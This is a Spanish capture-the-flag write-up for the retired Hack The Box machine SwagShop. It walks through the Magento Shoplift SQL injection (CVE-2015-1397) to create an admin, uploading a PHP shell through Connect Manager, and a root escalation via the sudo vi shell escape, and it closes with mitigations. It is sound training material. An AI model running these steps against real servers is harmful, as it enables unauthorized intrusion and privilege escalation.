---
machine: SwagShop
os: Linux
difficulty: Easy
platform: Hack The Box
category: Web / Linux
state: Retired
tags: [linux, magento, sqli, cve-2015-1397, connect-manager, sudo, vi, gtfobins]
---

# SwagShop — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de método; sin flags ni credenciales reales.

## TL;DR

Magento 1.9.0.0 con la **SQLi Shoplift (CVE-2015-1397)**, que crea un usuario administrador. Desde el panel se llega al **Magento Connect Manager** (`/downloader`) y se sube un paquete con un shell PHP → `www-data`. La escalada es un `sudo` sobre `vi` limitado al webroot: escape de GTFOBins.

## Reconocimiento

```bash
nmap -p- -sCV <IP> -oN nmap.txt
```

```text
22/tcp open  ssh   OpenSSH 7.2p2 Ubuntu
80/tcp open  http  Apache httpd 2.4.29 ((Ubuntu))
```

```bash
echo "<IP> swagshop.htb" | sudo tee -a /etc/hosts
gobuster dir -u http://swagshop.htb -w /usr/share/wordlists/dirb/common.txt
```

Aparecen `/index.php/admin`, `/downloader` y `/app/etc/local.xml` (que confirma Magento y la versión).

## Acceso

1. **Crear admin con la SQLi**:

```bash
searchsploit -m 37977
python2 37977.py        # editar la URL del objetivo
```

```text
WORKED
Check http://swagshop.htb/index.php/admin with creds <user>:<password>
```

2. **Connect Manager**: con la sesión de admin, `http://swagshop.htb/downloader/` permite subir un paquete. Se empaqueta un `shell.php` dentro de la estructura de un módulo y se instala; el shell queda accesible en la ruta del paquete.

3. **Shell** como `www-data` en `/var/www/html`.

## Escalada

```bash
sudo -l
```

```text
User www-data may run the following commands on swagshop:
    (root) NOPASSWD: /usr/bin/vi /var/www/html/*
```

Escape clásico:

```bash
sudo /usr/bin/vi /var/www/html/index.php -c ':!/bin/sh'
# o dentro de vi:  :set shell=/bin/bash  y  :shell
```

```text
root@swagshop:/var/www/html# id
uid=0(root)
```

## Tropiezos

- **`/downloader` deshabilitado**: si el Connect Manager no está, la vía alternativa es *Froghopper* (inyección en plantilla de admin) para ejecutar PHP.
- **Ruta del shell**: depende de cómo se empaquete; conviene listar el directorio tras instalar.
- **`vi` con comodín**: la regla `sudo` incluye `/var/www/html/*`, así que hay que escribir el fichero dentro de esa ruta.

## Lecciones

- Una SQLi que permite insertar un admin convierte un CMS en RCE por su propio panel de extensiones.
- `sudo` sobre `vi`/`vim` con comodines es root: el editor ejecuta comandos.
- Mitigación: parchear Magento, quitar el Connect Manager y no dar `sudo` sobre editores.
